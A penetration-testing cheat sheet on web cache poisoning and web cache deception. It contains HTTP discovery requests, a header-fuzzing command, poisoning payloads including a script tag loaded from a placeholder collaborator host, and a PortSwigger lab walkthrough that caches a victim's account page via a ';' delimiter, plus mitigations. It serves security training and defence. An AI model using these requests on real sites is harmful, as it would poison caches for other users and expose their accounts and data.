# 🧪 Web Cache Poisoning & Deception Cheat Sheet
> **Scope:** Authorized testing only. Use caches you control or targets with explicit written permission/lab rules. Poisoned entries affect other users — isolate tests with unique cache-busters and clean up where possible.

---
## ⚡ Quick Reference
| Technique | Input abused | Tell-tale sign |
|-----------|--------------|----------------|
| **Unkeyed header** | `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Host` | Header value reflected in cached response |
| **Unkeyed query param** | `?utm_source=`, `?cb=` | Body changes, cache key does not |
| **Cookie poisoning** | `lang`, theme, locale cookies | Response varies by cookie but key omits it |
| **Key normalization** | `?x=1` vs `?x=%31`, encoded slashes | Proxy and origin disagree on the key |
| **Web cache deception** | `;`, `.js`, `?` path delimiters | Dynamic page cached as a static asset |
| **DoS poisoning** | Unkeyed header forcing 500/huge body | Error cached for every visitor |

---
## 🧠 Cache Basics
```text
Cache key ≈ method + host + path + keyed query params
Everything else (headers, cookies, unkeyed params) is ignored for storage
```

| Header | Meaning |
|--------|---------|
| `Cache-Control: max-age=60` | Fresh for 60 s — your window |
| `Age: 12` / `X-Cache: HIT` | Cache age / hit indicator |
| `Vary: Origin, Accept-Encoding` | Dimensions included in the key |
| `CF-Cache-Status`, `Via` | Other cache fingerprints |

**Workflow:** find an input that is **reflected** but **not keyed** → poison → victim loads it → retrieve cached response.

---
## 🔍 Discovery
```http
GET /<PATH>?cb=<UNIQUE1> HTTP/1.1
Host: <HOST>

GET /<PATH>?cb=<UNIQUE1> HTTP/1.1
Host: <HOST>
```

*Second request should be a HIT. Keep the URL fixed and vary only the suspicious header.*

```http
GET /<PATH>?cb=<UNIQUE2> HTTP/1.1
Host: <HOST>
X-Forwarded-Host: <COLLAB>
X-Original-URL: /<PATH>
X-Rewrite-URL: /<PATH>
```

*If `<COLLAB>` appears in the cached body, the header is unkeyed.*

```bash
# Burp Param Miner: guess params + headers
ffuf -u https://<HOST>/<PATH> -w headers.txt -H 'FUZZ: <COLLAB>' -fs <BASELINE_SIZE>
```

---
## 💣 Poisoning Payloads
```http
GET /<PATH>?cb=<UNIQUE3> HTTP/1.1
Host: <HOST>
X-Forwarded-Host: <COLLAB>
```
```html
<script src="//<COLLAB>/script.js"></script>
```

```http
GET /<PATH>?cb=<UNIQUE4>&utm_source=<PAYLOAD> HTTP/1.1
Host: <HOST>

GET /<PATH>?cb=<UNIQUE5> HTTP/1.1
Host: <HOST>
Cookie: lang=<PAYLOAD>; theme=<PAYLOAD>
```

```http
GET /<PATH>?cb=<UNIQUE6>&x=1 HTTP/1.1
Host: <HOST>

GET /<PATH>?cb=<UNIQUE6>&x=%31 HTTP/1.1
Host: <HOST>

GET /<PATH>%2f..%2f<PATH>?cb=<UNIQUE6> HTTP/1.1
Host: <HOST>
```

*Different bodies sharing one cached object = normalization mismatch.*

---
## 🎯 Web Cache Deception — Path Delimiters
| Delimiter | Cache sees | Origin sees | Useful? |
|-----------|-----------|-------------|---------|
| `;` (path parameter) | Full path incl. `.js` | Path **before** `;` | ✅ yes |
| `?` (query) | Path before `?`, no static extension | Path before `?` | ❌ no |
| `#` (fragment) | Never sent | Never sent | ❌ no |

### Case Study — PortSwigger lab: "Exploiting path delimiters for web cache deception"
`/my-account` returns the logged-in user's account page with a victim-specific secret. The **origin treats `;` as a path delimiter**; the **cache does not** — it only inspects the final extension.

1. **Confirm as yourself:**
   ```http
   GET /my-account;<TOKEN>.js HTTP/1.1
   Host: <HOST>
   ```
   Origin resolves it to `/my-account` (200 with your account page); cache sees `.js` and stores it as a static object.

2. **Why `?` fails:** `/my-account?.js` is a delimiter for **both** layers. The cache sees `/my-account` with no `.js`, so it never treats the response as cacheable. `?` cannot smuggle a static extension.

3. **Deliver to the victim via the exploit server:** host a page that navigates the victim to `https://<HOST>/my-account;<UNIQUE_TOKEN>.js`. Use a **fresh unique token** every attempt so you never overwrite another run's cached response.

4. **Fetch before `max-age` expires:** request the same URL yourself; a HIT should contain the victim's account data.

5. **Record safely:** note only that a secret was present (e.g., `<SECRET_PREFIX>`). **Never copy, log, or store the real value** — no flags, API keys, or passwords in notes or reports.

> Lesson: cache and origin must parse delimiters identically; any asymmetry can turn a private page into a cached "static" file.

---
## 💥 Impact
Session/PII leakage via cached account pages · stored XSS from poisoned scripts · credential/token theft through rewritten links · auth bypass via cached admin responses · DoS from cached errors.

---
## 🛡️ Mitigation
- Build an **explicit cache key**: method, host, path, allowlisted query params.
- Strip unkeyed headers (`X-Forwarded-*`, `X-Original-URL`, `X-Rewrite-URL`) at the edge.
- Send `Cache-Control: private, no-store` on authenticated/dynamic responses.
- Ignore file extensions for dynamic routes; reject `;` path parameters on sensitive paths.
- Make cache and origin use the **same URL parser/delimiter rules**; decode once, consistently.
- Honor `Vary` for headers that change output; never cache `Set-Cookie` responses.
- Serve static assets from a dedicated path (e.g., `/static/`) with strict routing.

---
## ✅ Testing Checklist
- [ ] Authorization and isolated scope confirmed
- [ ] Cache HIT/MISS behavior verified
- [ ] Unique cache-buster per request
- [ ] Reflected headers and unkeyed params/cookies tested
- [ ] Key normalization variants tried (`%31`, encoded slashes)
- [ ] `;` vs `?` delimiters compared
- [ ] Delivered via exploit server; cached response fetched within `max-age`
- [ ] Fresh token used; no real secrets or flags recorded
- [ ] Findings reported with redacted evidence

---
## 📚 References
- [PortSwigger — Web cache deception](https://portswigger.net/web-security/web-cache-deception)
- [PortSwigger — Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [Practical Web Cache Poisoning (PortSwigger Research)](https://portswigger.net/research/practical-web-cache-poisoning)
- [RFC 9111 — HTTP Caching](https://www.rfc-editor.org/rfc/rfc9111)

---
**🧪 Happy (authorized) caching!**
